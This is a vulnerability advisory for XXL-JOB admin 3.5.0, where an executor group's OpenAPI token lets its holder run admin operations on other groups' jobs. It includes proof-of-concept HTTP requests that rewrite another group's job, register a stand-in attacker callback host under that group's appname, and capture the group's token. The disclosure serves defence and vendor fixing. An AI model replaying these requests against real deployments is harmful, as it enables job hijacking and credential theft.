# XXL-JOB-2026-02: OpenAPI access token not bound to its executor group

| | |
|---|---|
| Product | XXL-JOB, `xxl-job-admin` (https://github.com/xuxueli/xxl-job) |
| Vendor | xuxueli |
| Affected version | 3.5.0 (latest release, tag commit `3bebfc16`). Earlier versions not tested. |
| Fixed version | none at time of writing |
| Vulnerability type | Incorrect Access Control (CWE-863, incorrect authorization) |
| Required access | Access token of any one executor group (no login) |
| CVE | pending (requested from MITRE 2026-11-17) |
| Reporter | thientc (VinSOC) |
| Related | CVE-2026-7306 (different root cause) |

## Summary

The admin OpenAPI (`/api/{uri}`) checks that a request carries the access token of the group named in its `XXL-JOB-APPNAME` header, then runs the requested operation as an administrator on any job or registry key. One executor group's token is enough to update, trigger or remove other groups' jobs, and to register an attacker address under another group's appname. The scheduler then sends that group's jobs, with that group's access token, to the attacker.

## Details

In 3.5.0 each executor group has its own access token. `OpenApiController` skips login (`@XxlSso(login = false)`) and accepts a request when the token matches the group looked up by appname (`xxl-job-admin/src/main/java/com/xxl/job/admin/business/scheduler/openapi/OpenApiController.java:63`):

```java
XxlJobGroup xxlJobGroup = XxlJobAdminBootstrap.getInstance().getJobRegistryHelper().loadByAppName(appname);
if (!(xxlJobGroup!=null && accessToken.equals(xxlJobGroup.getAccessToken()))) {
```

The operations then run with a fixed ADMIN login (`openapi/impl/AdminJobBizImpl.java:33-38`, `OPENAPI_LOGIN_INFO`), for example `xxlJobService.update(jobInfo, OPENAPI_LOGIN_INFO)`. Nothing compares the caller's group with the group that owns the job id, registry key or log id in the request body.

CVE-2026-7306 covers the shipped default token `default_token`; the maintainer's answer there (issue #3938) was to set a custom token. This issue remains with custom, unique tokens per group.

## Proof of concept

Local lab built from the 3.5.0 tag (Spring Boot 4.1.2). Two groups with distinct custom tokens: group 1 `lab-g1-token-7f3a9c`, group 2 `lab-g2-token-91cd4e`. A wrong token is rejected (`accessToken or appname invalid`).

All requests below use group 2's credentials:

```
XXL-JOB-ACCESS-TOKEN: lab-g2-token-91cd4e
XXL-JOB-APPNAME: xxl-job-executor-sample-ai

POST /api/updateJob   {"id":1, ..., "executorParam":"L06-G2TOKEN-MARKER-33ab"}
-> Success. Job 1 (group 1) now has executor_param L06-G2TOKEN-MARKER-33ab.

POST /api/registry    {"registryGroup":"EXECUTOR","registryKey":"xxl-job-executor-sample","registryValue":"http://callback:9999/l06-hijack/"}
-> Success. After the registry refresh, group 1's address_list is http://callback:9999/l06-hijack/.

POST /api/triggerJob  {"id":1,"executorParam":"L06-TRIGGER-MARKER-d41f"}
-> Success.
```

The local collector standing in for an attacker host then received:

```
POST /l06-hijack/trigger
XXL-JOB-APPNAME: xxl-job-executor-sample
XXL-JOB-ACCESS-TOKEN: lab-g1-token-7f3a9c
{"jobId":1,"executorHandler":"demoJobHandler","executorParams":"L06-TRIGGER-MARKER-d41f", ...}
```

`xxl-job-executor-sample` and `lab-g1-token-7f3a9c` are group 1's appname and token.

## Impact

Whoever holds one executor's credentials controls the jobs of every group, can redirect another group's job dispatch to an address they choose, and receives that group's token. I did not test code execution on a real executor.

## Fix

Bind each OpenAPI call to the group whose token authenticated it: reject job ids, registry keys and log ids that belong to other groups, and use a login limited to that group instead of a global ADMIN login.

## Timeline

- 2026-11-02: reported to the vendor by email. No reply.
